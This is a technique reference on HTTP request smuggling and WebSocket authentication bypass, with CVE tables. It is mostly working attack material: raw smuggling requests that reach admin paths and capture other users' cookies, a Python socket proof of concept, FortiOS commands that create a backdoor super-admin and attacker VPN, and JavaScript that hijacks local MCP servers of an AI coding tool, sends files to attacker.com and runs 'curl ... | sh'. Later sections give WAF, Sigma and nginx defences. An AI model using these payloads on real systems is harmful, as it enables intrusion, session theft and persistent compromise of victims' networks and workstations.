# HTTP Request Smuggling & WebSocket Authentication Bypass - Advanced Techniques

## Overview

This document covers HTTP request smuggling (CL.TE, TE.CL, TE.TE desync) and WebSocket authentication bypass attacks, including recent CVEs from 2024-2026. These protocol-level attacks bypass proxy authentication, WAF rules, and ACLs by exploiting parsing discrepancies between front-end proxies and back-end servers, or by abusing WebSocket upgrade handshakes that lack proper authentication validation.

---

## 1. HTTP Request Smuggling: CL.TE/TE.CL Desync for Auth Bypass

### 1.1 Attack Theory

A single HTTP request is interpreted as two by front-end/back-end due to Content-Length/Transfer-Encoding disagreement. The smuggled request bypasses all proxy-level authentication, WAF rules, and ACLs.

**Three primary desync variants:**

| Variant | Front-end Uses | Back-end Uses | Effect |
|---------|---------------|---------------|--------|
| CL.TE | Content-Length | Transfer-Encoding | Front-end forwards full CL body; back-end stops at chunk terminator, treats remainder as new request |
| TE.CL | Transfer-Encoding | Content-Length | Front-end reads chunked body; back-end reads CL bytes, treats remainder as new request |
| TE.TE | Transfer-Encoding (strict) | Transfer-Encoding (lenient) | One side confused by obfuscated TE header, falls back to CL |

### 1.2 CVE Reference Table

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2025-55315 | ASP.NET Kestrel | 9.9 | Chunk extension with embedded CR/LF causes boundary disagreement (Microsoft's highest-ever ASP.NET Core CVSS) |
| CVE-2025-32094 | Akamai | Critical | OPTIONS + obsolete line folding (obs-fold) causes parsing difference between two Akamai edge servers |
| CVE-2024-53008 | HAProxy | 5.3 | Inconsistent message framing allows remote attackers to reach ACL-restricted paths |
| CVE-2024-33452 | Kong/OpenResty | Critical | HEAD requests with bodies split into two pipelined requests; enables WAF bypass |
| CVE-2025-64484 | OAuth2-Proxy | High | Header normalization smuggling: underscore vs hyphen treatment bypasses auth header stripping |
| CVE-2024-27982 | Node.js | High | Leading space in Content-Length header parsed differently |
| CVE-2025-49812 | Apache HTTP Server | Critical | Session hijacking via TLS upgrade mechanism desync |
| CVE-2025-43859 | h11 Python library | High | Lenient line terminator handling enables smuggling |
| CVE-2025-4366 | Various | High | Expect-based desync (0.CL) from Black Hat USA 2025 |

### 1.3 Reproduction Steps

#### CL.TE Basic Probe

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The `G` becomes the start of a smuggled `GPOST /admin` request. If the back-end responds with an unexpected error or delay, CL.TE desync is confirmed.

#### CL.TE Exploitation - Admin Endpoint Access

```
POST / HTTP/1.1
Host: target.com
Content-Length: 40
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com

```

The front-end sees one POST request of 40 bytes. The back-end processes the chunked body (ending at `0\r\n\r\n`) and treats `GET /admin HTTP/1.1` as a new request that bypasses proxy auth.

#### TE.CL Probe

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /admin HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Front-end reads chunked; back-end reads 4 bytes of CL, treats the rest as a new request.

#### TE.TE Obfuscation Variants

When both sides support Transfer-Encoding but one can be confused:

```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
X: x[\n]Transfer-Encoding: chunked
Transfer-Encoding: chunked      # (trailing space)
```

#### Session Capture via Smuggling

Smuggle a partial POST that causes the next user's Cookie header to be appended to an attacker-controlled body:

```
POST / HTTP/1.1
Host: target.com
Content-Length: 150
Transfer-Encoding: chunked

0

POST /log HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400

data=
```

The next legitimate user's request (including their `Cookie: session=...` header) gets appended as the POST body to `/log`, which the attacker retrieves.

### 1.4 CVE-2025-55315: ASP.NET Kestrel Chunk Extension Smuggling

**CVSS: 9.9 (Microsoft's highest-ever for ASP.NET Core)**

Chunk extensions with embedded CR/LF characters cause Kestrel to disagree with the front-end proxy about message boundaries.

**PoC:** `github.com/N3mes1s/d0897c13ca199e739ecc2b562f466040`

A raw-socket Python harness is required since curl normalizes chunked framing:

```python
import socket, ssl

sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ssock = ctx.wrap_socket(sock, server_hostname='target.com')

# Craft chunked request with chunk extension containing embedded CR/LF
payload = (
    b"POST / HTTP/1.1\r\n"
    b"Host: target.com\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"5;ext=foo\r\n"     # chunk with extension
    b"AAAAA\r\n"
    b"0;ext=bar\n"       # lone LF in chunk extension - triggers CVE
    b"\r\n"
    b"GET /admin HTTP/1.1\r\n"
    b"Host: target.com\r\n"
    b"\r\n"
)
ssock.send(payload)
print(ssock.recv(4096).decode())
```

Kestrel (before patch) accepts the lone `\n` and considers the chunked body complete. The proxy sees the final chunk differently, and `GET /admin` becomes a smuggled request.

**Affected:** ASP.NET Core Kestrel <= 7.0.20. Patch: October 14, 2025.

### 1.5 CVE-2025-32094: Akamai Obs-fold Smuggling

**Presented at Black Hat USA 2025 by James Kettle.**

Two Akamai edge servers parsed requests differently due to obsolete line folding (continuation whitespace) in headers:

```
POST / HTTP/1.1
Host: target.com
Expect: 100-continue
 Transfer-Encoding: chunked
Content-Length: 50

0

GET /admin HTTP/1.1
Host: target.com

```

The obs-fold (leading space on line 2 of the header) causes one edge to read it as a continuation of `Expect`, while another treats `Transfer-Encoding: chunked` as a separate header.

### 1.6 CVE-2024-53008: HAProxy Message Framing Bypass

Inconsistent request interpretation in HAProxy allows remote attackers to reach ACL-restricted paths.

```bash
# Send requests with inconsistent message framing to bypass HAProxy ACL
# protecting admin endpoints
curl -X POST https://target.com/ \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 30" \
  --data-binary $'0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n'
```

**Fixed in:** HAProxy 2.6.19+, 2.8.11+, 2.9.10+, 3.0.3+

### 1.7 CVE-2024-33452: Kong/OpenResty HEAD Method Smuggling

HEAD requests with bodies are split into two pipelined requests by the backend, while front-end proxies treat them as one. This enables WAF bypass.

```bash
# HEAD request with body - Kong/OpenResty splits into two requests
printf 'HEAD / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 50\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n' | nc target.com 80
```

**Fixed in:** lua-nginx-module after v0.10.26

### 1.8 CVE-2025-64484: OAuth2-Proxy Header Normalization Smuggling

OAuth2-Proxy strips sensitive headers like `X-Forwarded-Email` before forwarding. However, headers with underscores (`X_Forwarded_Email`) bypass the stripping. The backend (e.g., Nginx) normalizes underscores to hyphens, treating them as equivalent.

```bash
# Bypass OAuth2-Proxy header stripping
# OAuth2-Proxy strips X-Forwarded-Email but NOT X_Forwarded_Email
curl https://target.com/api/protected \
  -H "X_Forwarded_Email: admin@company.com" \
  -H "X_Forwarded_User: admin"

# Backend treats X_Forwarded_Email as X-Forwarded-Email
# Result: authenticated as admin without OAuth flow
```

**Fixed in:** OAuth2-Proxy v7.13.0+

### 1.9 0.CL Desync (Expect-Based) - Black Hat 2025

James Kettle's "HTTP/1 Must Die" research introduced this technique:

```
POST /admin HTTP/1.1
Host: target.com
Expect: 100-continue
Content-Length: 50

<body with smuggled request>
```

The front-end forwards only headers (waiting for 100 Continue). The back-end reads Content-Length bytes from the connection, consuming the next user's request as the body.

**Affected real-world targets:** T-Mobile, GitLab, Netlify CDN, Akamai CDN.

---

## 2. WebSocket Authentication Bypass via Upgrade Hijacking

### 2.1 Attack Theory

WebSocket endpoints frequently lack authentication or validate identity only during the HTTP upgrade handshake, never re-checking afterward. Three attack patterns:

1. **Direct WebSocket auth bypass** -- crafted requests to WebSocket endpoints with arbitrary tokens
2. **Cross-Site WebSocket Hijacking (CSWSH)** -- browsers attach session cookies to upgrade requests without Origin validation
3. **Local WebSocket hijacking** -- scanning localhost ports from malicious webpages to connect to IDE/tool WebSocket servers

### 2.2 CVE Reference Table

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2024-55591 | FortiOS/FortiProxy | 9.6-9.8 | Zero-day: unauthenticated super-admin via /ws/cli/ WebSocket with arbitrary local_access_token |
| CVE-2025-24472 | FortiOS | 8.1 | Separate auth bypass via CSF proxy request path |
| CVE-2025-52882 | Claude Code MCP | 8.8-9.3 | Local WebSocket MCP server with no Origin validation; any website can execute MCP tools |

### 2.3 CVE-2024-55591: FortiOS WebSocket Authentication Bypass

**CVSS: 9.6-9.8 | Zero-day actively exploited since November 2024 | CISA KEV**

Unauthenticated attackers abused the Node.js WebSocket module's `/ws/cli/` endpoint. The module accepted any value in the `local_access_token` parameter without cryptographic validation, combined with a race condition during server initialization.

**Reproduction:**

```bash
# Step 1: Connect to FortiOS WebSocket endpoint with arbitrary token
wscat -c "wss://target-fortios.com/ws/cli/?local_access_token=ARBITRARY_VALUE"

# Step 2: If race condition during initialization is hit, handshake completes
# yielding a super-admin jsconsole session

# Step 3: Post-exploitation - create admin accounts
> config system admin
> edit attacker_admin
> set password AttackerP@ss
> set accprofile super_admin
> next
> end

# Step 4: Modify VPN configurations for persistence
> config vpn ipsec phase1-interface
> edit attacker_vpn
> set interface port1
> set remote-gw <attacker_ip>
> next
> end
```

**Post-exploitation observed in the wild:**
- Creating admin accounts
- Modifying firewall policies
- Changing VPN group configurations
- Extracting full device configuration

### 2.4 CVE-2025-52882: Claude Code MCP Local WebSocket Hijacking

**CVSS: 8.8-9.3 | CWE-1385: Missing Origin Validation in WebSockets**

Local WebSocket MCP servers in Claude Code IDE extensions had no Origin validation. Any website visited by the user could connect, brute-force the port, and execute MCP tools including file reads and code execution.

**Reproduction JavaScript (from malicious webpage):**

```javascript
// Port scanning for local MCP WebSocket servers
async function scanAndExploit() {
  for (let port = 3000; port < 4000; port++) {
    try {
      let ws = new WebSocket(`ws://localhost:${port}`);
      
      ws.onopen = () => {
        console.log(`Found MCP server on port ${port}`);
        
        // Step 1: Enumerate available tools
        ws.send(JSON.stringify({
          "jsonrpc": "2.0",
          "method": "tools/list",
          "id": 1
        }));
      };
      
      ws.onmessage = (event) => {
        let response = JSON.parse(event.data);
        
        if (response.id === 1) {
          // Step 2: Read sensitive files
          ws.send(JSON.stringify({
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
              "name": "read_file",
              "arguments": {"path": "/etc/passwd"}
            },
            "id": 2
          }));
        }
        
        if (response.id === 2) {
          // Step 3: Exfiltrate data
          fetch('https://attacker.com/exfil', {
            method: 'POST',
            body: JSON.stringify(response)
          });
          
          // Step 4: Execute arbitrary code (if Jupyter tool available)
          ws.send(JSON.stringify({
            "jsonrpc": "2.0",
            "method": "tools/call",
            "params": {
              "name": "execute_code",
              "arguments": {
                "code": "import os; os.system('curl https://attacker.com/shell.sh | sh')"
              }
            },
            "id": 3
          }));
        }
      };
      
      // Timeout per port to keep scanning fast
      setTimeout(() => ws.close(), 500);
    } catch(e) {
      // Port not open, continue scanning
    }
  }
}

scanAndExploit();
```

**Fixed in:** Claude Code 1.0.24 and VS Code extension 0.1.9 for JetBrains.

**Key insight:** The assumption that localhost connections are safe is fundamentally flawed -- any website in the user's browser can connect to localhost WebSocket servers.

### 2.5 Cross-Site WebSocket Hijacking (CSWSH)

Browsers attach cookies to WebSocket upgrade requests. If the server does not validate the Origin header, any website can establish an authenticated WebSocket channel.

**Basic CSWSH Test:**

```javascript
// Host on attacker.com
var ws = new WebSocket('wss://target.com/ws');

ws.onopen = function() {
  console.log('Connection established - CSWSH confirmed');
  // Send commands as the authenticated user
  ws.send(JSON.stringify({action: 'get_user_data'}));
  ws.send(JSON.stringify({action: 'list_admin_users'}));
  ws.send(JSON.stringify({action: 'export_database'}));
};

ws.onmessage = function(e) {
  // Exfiltrate all received data
  fetch('https://attacker.com/log?data=' + encodeURIComponent(e.data));
};

ws.onerror = function(e) {
  // Origin validation present - not vulnerable
  console.log('Connection refused - Origin validated');
};
```

**Origin Header Validation Test:**

```bash
# Test with spoofed Origin header
wscat -c wss://target.com/ws -H 'Origin: https://evil.com'

# If connection is accepted, Origin validation is missing
# If connection is refused with 403, validation is present

# Test with no Origin header
wscat -c wss://target.com/ws

# Test with null Origin (via sandboxed iframe)
# <iframe sandbox="allow-scripts" src="data:text/html,<script>
# var ws = new WebSocket('wss://target.com/ws');
# ws.onopen = function() { /* exploit */ };
# </script>"></iframe>
```

**Full CSWSH Exploitation Page:**

```html
<!DOCTYPE html>
<html>
<head><title>CSWSH PoC</title></head>
<body>
<script>
// Full CSWSH exploitation
var ws = new WebSocket('wss://vulnerable-target.com/ws/api');

ws.onopen = function() {
  // Phase 1: Enumerate capabilities
  ws.send(JSON.stringify({
    type: 'query',
    resource: 'user_profile'
  }));
};

ws.onmessage = function(event) {
  var data = JSON.parse(event.data);
  
  // Phase 2: Exfiltrate sensitive data
  var img = new Image();
  img.src = 'https://attacker.com/collect?d=' + 
    btoa(JSON.stringify(data));
  
  // Phase 3: Perform privileged actions
  if (data.role === 'admin') {
    ws.send(JSON.stringify({
      type: 'admin_action',
      action: 'create_user',
      params: {
        username: 'backdoor',
        password: 'P@ssw0rd!',
        role: 'admin'
      }
    }));
  }
};
</script>
<p>Loading...</p>
</body>
</html>
```

---

## 3. HTTP Smuggling for Session Hijacking

### 3.1 Smuggled Request Session Capture

The attacker smuggles a partial POST request. The next legitimate user's request (including authentication headers) gets appended as the POST body:

```
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Transfer-Encoding: chunked

0

POST /capture HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 800

stolen_data=
```

The next user's entire request (including `Cookie`, `Authorization`, `X-Auth-Token` headers) is appended to `stolen_data=`. The attacker later retrieves the POST body from `/capture`.

### 3.2 Auth Bypass via Smuggled Admin Request (Tesla Pattern)

On Tesla's `apm.ap.tesla.services`, request smuggling bypassed authentication entirely, allowing access to protected `/metrics` endpoints that normally return 401:

```
POST / HTTP/1.1
Host: apm.ap.tesla.services
Content-Length: 45
Transfer-Encoding: chunked

0

GET /metrics HTTP/1.1
Host: apm.ap.tesla.services

```

The proxy's auth layer sees only the outer POST. The backend processes `/metrics` as a separate unauthenticated request.

---

## 4. Detection Signatures and WAF Rules

### 4.1 HTTP Smuggling Detection

```apache
# ModSecurity / WAF Rules

# Rule 1: Reject requests with both Content-Length and Transfer-Encoding
SecRule REQUEST_HEADERS:Transfer-Encoding "!^$" \
  "chain,id:9001,phase:1,deny,status:400,msg:'Dual CL/TE headers - smuggling attempt'"
SecRule REQUEST_HEADERS:Content-Length "!^$"

# Rule 2: Reject non-standard Transfer-Encoding values
SecRule REQUEST_HEADERS:Transfer-Encoding "!@streq chunked" \
  "id:9002,phase:1,deny,status:400,msg:'Non-standard Transfer-Encoding value'"

# Rule 3: Alert on chunk extensions with control characters
SecRule REQUEST_BODY "@rx [0-9a-fA-F]+;[^\r\n]*[\x00-\x1f]" \
  "id:9003,phase:2,deny,status:400,msg:'Chunk extension with control characters'"

# Rule 4: Block Transfer-Encoding with obfuscation
SecRule REQUEST_HEADERS:Transfer-Encoding "@rx ^\s|chunked\s+$|\t" \
  "id:9004,phase:1,deny,status:400,msg:'Obfuscated Transfer-Encoding header'"

# Rule 5: Block underscore headers that could smuggle through OAuth2-Proxy
SecRule REQUEST_HEADERS_NAMES "@rx ^X[-_]Forwarded[-_](Email|User|Groups|Preferred)" \
  "id:9005,phase:1,deny,status:403,msg:'Potential header normalization smuggling'"
```

### 4.2 WebSocket Detection

```apache
# Alert on WebSocket upgrade requests with unexpected Origin
SecRule REQUEST_HEADERS:Upgrade "@streq websocket" \
  "chain,id:9010,phase:1,log,msg:'WebSocket upgrade from untrusted origin'"
SecRule REQUEST_HEADERS:Origin "!@rx ^https://(www\.)?trusted-domain\.com$"

# Block WebSocket connections without Origin header
SecRule REQUEST_HEADERS:Upgrade "@streq websocket" \
  "chain,id:9011,phase:1,deny,status:403,msg:'WebSocket upgrade without Origin'"
SecRule &REQUEST_HEADERS:Origin "@eq 0"
```

### 4.3 Nginx Configuration for Smuggling Prevention

```nginx
# Overwrite X-Forwarded-For (never append)
proxy_set_header X-Forwarded-For $remote_addr;

# Strip dangerous override headers
proxy_set_header X-Original-URL "";
proxy_set_header X-Rewrite-URL "";
proxy_set_header X_Forwarded_Email "";
proxy_set_header X_Forwarded_User "";

# Enforce HTTP/1.1 to backend to reduce smuggling surface
proxy_http_version 1.1;

# Validate WebSocket Origin
map $http_origin $ws_origin_allowed {
    default 0;
    "https://trusted-app.com" 1;
}

location /ws/ {
    if ($ws_origin_allowed = 0) {
        return 403;
    }
    proxy_pass http://backend;
    proxy_http_version 1.1;
    proxy_set_header Upgrade $http_upgrade;
    proxy_set_header Connection "upgrade";
}
```

### 4.4 Sigma Detection Rules

```yaml
# Sigma rule for HTTP Request Smuggling indicators
title: HTTP Request Smuggling Attempt
status: experimental
logsource:
    category: webserver
detection:
    selection_dual_headers:
        cs-headers|contains|all:
            - 'Transfer-Encoding'
            - 'Content-Length'
    selection_te_variants:
        cs-Transfer-Encoding|re: '(?i)(xchunked|chunked\s|^\s+chunked|\tchunked)'
    condition: selection_dual_headers or selection_te_variants
level: high

---
# Sigma rule for FortiOS CVE-2024-55591
title: FortiOS WebSocket Auth Bypass Attempt
status: experimental
logsource:
    category: webserver
detection:
    selection:
        cs-uri-stem|contains: '/ws/cli/'
        cs-uri-query|contains: 'local_access_token'
    filter:
        source.ip|cidr:
            - '10.0.0.0/8'
            - '172.16.0.0/12'
            - '192.168.0.0/16'
    condition: selection and not filter
level: critical
```

---

## 5. Smuggling Detection Tools

### 5.1 Automated Detection

```bash
# smuggler.py - HTTP request smuggling detector
git clone https://github.com/defparam/smuggler
python3 smuggler/smuggler.py -u https://target.com -m POST

# Burp Suite HTTP Request Smuggler extension
# Install from BApp Store, then:
# 1. Right-click site in site map
# 2. "Extensions > HTTP Request Smuggler > Launch"
# 3. Automated CL.TE, TE.CL, and TE.TE probing

# Manual timing-based CL.TE detection
# If this causes a 5-10 second delay, CL.TE is likely:
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ' | timeout 10 openssl s_client -connect target.com:443 -quiet
```

### 5.2 Port Scanning for Local WebSocket Servers

```bash
# Find local WebSocket servers from IDE extensions
netstat -tlnp 2>/dev/null | grep LISTEN
ss -tlnp | grep LISTEN

# Targeted scan for common MCP/IDE WebSocket ports
for port in $(seq 3000 4000); do
  timeout 1 bash -c "echo | nc -w1 localhost $port" 2>/dev/null && \
    echo "Port $port open - potential WebSocket server"
done
```

---

## 6. Chaining Matrix

| Entry Vector | Chain Step | Final Impact |
|-------------|-----------|--------------|
| CL.TE smuggling | -> Admin endpoint access | Auth bypass to admin panel |
| CL.TE smuggling | -> Session cookie capture | Account takeover via hijacked session |
| TE.CL smuggling | -> Cache poisoning | Mass user compromise via cached malicious response |
| Header normalization (CVE-2025-64484) | -> OAuth2-Proxy bypass | Identity spoofing as any user |
| CSWSH | -> Authenticated WebSocket commands | Data exfiltration, privilege escalation |
| FortiOS WebSocket (CVE-2024-55591) | -> Super-admin access -> VPN config | Persistent network access |
| Local WebSocket hijack (CVE-2025-52882) | -> File read + code execution | Full workstation compromise |
| Smuggling + XSS | -> Stored XSS via smuggled response | Persistent cross-user attack |

---

## 7. Remediation Summary

### HTTP Smuggling Prevention
1. **Use HTTP/2 end-to-end** to eliminate connection sharing between unrelated requests
2. **Reject dual CL/TE headers** at the proxy/WAF level
3. **Normalize Transfer-Encoding** before forwarding; strip chunk extensions
4. **Upgrade affected components:** Kestrel (Oct 2025 patch), HAProxy 2.6.19+/2.8.11+/2.9.10+/3.0.3+, OpenResty lua-nginx-module post v0.10.26, OAuth2-Proxy 7.13.0+
5. **Disable connection reuse** between different clients at the proxy

### WebSocket Security
1. **Validate Origin header** against explicit allowlist on all WebSocket endpoints
2. **Re-authenticate on sensitive operations** post-handshake, not just during upgrade
3. **Bind localhost WebSocket servers to random ports** with authentication tokens
4. **Enforce WSS (TLS)** and enable HSTS
5. **Inventory all local WebSocket servers** from IDE extensions and dev tools

### Key References
- James Kettle, "HTTP/1 Must Die: The Desync Endgame" - Black Hat USA 2025
- PortSwigger Web Security Academy - Request Smuggling labs
- `github.com/defparam/smuggler` - Automated detection
- `github.com/N3mes1s/d0897c13ca199e739ecc2b562f466040` - CVE-2025-55315 PoC
- `securitylabs.datadoghq.com/articles/claude-mcp-cve-2025-52882/` - MCP local hijacking analysis
